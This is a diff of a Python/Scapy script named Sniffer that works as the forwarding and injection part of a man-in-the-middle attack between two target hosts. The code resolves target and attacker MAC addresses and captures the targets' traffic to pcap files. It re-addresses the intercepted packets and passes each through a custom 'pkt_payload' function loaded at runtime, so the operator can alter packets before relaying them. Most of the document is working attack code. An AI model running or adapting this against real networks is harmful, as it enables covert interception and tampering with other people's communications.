@@ -1,73 +1,84 @@
 import scapy.all as scapy
-import sys
+import datetime
 import os
+from importlib import import_module
 
 
 class Sniffer:
 
-    def __init__(self, target_1_ip, target_2_ip, write_to_pcap=False):
-        self.write_to_pcap = self.set_new_pcap(write_to_pcap)
+    def __init__(self, target_1_ip, target_2_ip, write_to_pcap=False, payload_option=None):
+        self.target_1 = {"IP": target_1_ip, "MAC": scapy.getmacbyip(target_1_ip)}
+        self.target_2 = {"IP": target_2_ip, "MAC": scapy.getmacbyip(target_2_ip)}
+        self.attacker = self.get_my_ip_and_mac()
         self.iface = self.get_iface()
-        self.target_1 = { "IP":target_1_ip, "MAC":self.get_mac(target_1_ip)}
-        self.target_2 = {"IP": target_2_ip, "MAC": self.get_mac(target_2_ip)}
+        self.write_to_pcap = self.set_new_pcap(write_to_pcap)
+        self.payload_option = self.read_payload_options(payload_option)
 
-    def set_new_pcap(self, write_to_pcap):
-        if write_to_pcap is False:
-            return False
+    @staticmethod
+    def set_new_pcap(write_to_pcap):
+        file_name = None
+        if write_to_pcap is True:
+            path = "packet_captures"
+            if not os.path.exists(path):
+                os.makedirs(path)
+            file_name = path + "/capture - " + datetime.datetime.now().strftime("%d_%m_%Y-%H_%M_%S-%f") + ".pcap"
+        return {"wr": write_to_pcap, "arg": file_name}
+
+    @staticmethod
+    def read_payload_options(predefined_options):
+        if predefined_options is None:
+            while True:
+                option = input("Choose one of the payload options:\n 1- No payload, "
+                               "just print the sniffed packets\n "
+                               "2 - Custom payload\n")
+                if option == '1':
+                    arg = None
+                    break
+                if option == '2':
+                    file = input("Enter the path to file that implements the payload without the extension, ex: abc.py should "
+                                "be entered as abc only\n")
+                    mod = import_module(file)
+                    arg = getattr(mod, "pkt_payload")
+                    break
+            return {"option": option, "arg": arg}
         else:
-            if os.path.isfile("sniffed_packets.pcap"):
-                os.remove("sniffed_packets.pcap")
-            return True
+            return predefined_options
 
     def sniff_packets(self):
         capture_filter = "(host " + self.target_1["IP"] + \
                          " or host " + self.target_2["IP"] + ")"
         scapy.sniff(iface=self.iface, filter=capture_filter, prn=lambda x: self.forward_packets(x))
 
-    # Receive object scapy.Packet as argument
     def forward_packets(self, scapy_packet):
-        print(scapy_packet.summary())
-        l2_data = scapy_packet["Ethernet"]
+        #print(scapy_packet.summary())
 
-        if self.write_to_pcap is True:
-            scapy.wrpcap('sniffed_packets.pcap', scapy_packet, append=True)
+        if self.write_to_pcap["wr"] is True:
+            scapy.wrpcap(self.write_to_pcap["arg"], scapy_packet, append=True)
 
-        if l2_data.src == self.target_1["MAC"]:
-            # l2_data.dst in the line below is the attacker MAC
-            l2_data.src = l2_data.dst
-            l2_data.dst = self.target_2["MAC"]
-            scapy.sendp(scapy_packet, verbose=False)
-        if l2_data.src == self.target_2["MAC"]:
-            # l2_data.dst in the line below is the attacker MAC
-            l2_data.src = l2_data.dst
-            l2_data.dst = self.target_1["MAC"]
-            scapy.sendp(scapy_packet, verbose=False)
+        if "IP" in scapy_packet:
+            if scapy_packet["IP"].dst != self.attacker["IP"] and scapy_packet["Ethernet"].dst == self.attacker["MAC"]:
+                scapy_packet["Ethernet"].dst = self.target_1["MAC"] if scapy_packet["Ethernet"].src == self.target_2["MAC"] else self.target_2["MAC"]
+                scapy_packet["Ethernet"].src = self.attacker["MAC"]
 
-        # if l2_data.src == self.target_1["MAC"] or l2_data.src == self.target_2["MAC"]:
-        #     # l2_data.dst in the line below is the attacker MAC
-        #     l2_data.src = l2_data.dst
-        #     #olhar ip dst e achar mac
-        #     l2_data.dst = mac(scapy_packet["IP"].dst)
-        #     self.insert_payload(scapy_packet)
-        #     scapy.sendp(scapy_packet, verbose=False)
+                pkt = self.insert_payload(scapy_packet)
+                scapy.sendp(pkt, verbose=False, iface=self.iface)
 
-    # Não esquecer de lidar com checksums!!
-    def insert_payload(self, packet):
-        return 0
+    def insert_payload(self, scapy_packet):
+        if self.payload_option["option"] == "1":
+            return scapy_packet
+        elif self.payload_option["option"] == "2":
+            # self.payload_option["arg"] here is the function "pkt_payload" that receives (self, scapy_packet) as argument and
+            # was read from a file in read_payload_options() option n°2
+            return self.payload_option["arg"](self, scapy_packet)
 
     def get_iface(self):
         route = scapy.Route()
         iface = route.route(dst=self.target_1["IP"])[0]
         return iface
 
-    @staticmethod
-    def get_mac(ip):
-        pckt = scapy.ARP(pdst=ip, hwdst="00:00:00:00:00:00")
-        ans, unans = scapy.sr(pckt, timeout=5, verbose=False)
-        # Check if answer was received
-        if len(ans) > 0:
-            for snd, rcv in ans:
-                mac = rcv.hwsrc
-            return mac
-        else:
-            sys.exit("Could not discover mac of target " + ip + ". Is this host really active?")
+    def get_my_ip_and_mac(self):
+        route = scapy.Route()
+        ip = route.route(dst=self.target_1["IP"])[1]
+        mac = scapy.get_if_hwaddr(self.get_iface())
+        return {"IP": ip, "MAC": mac}
+
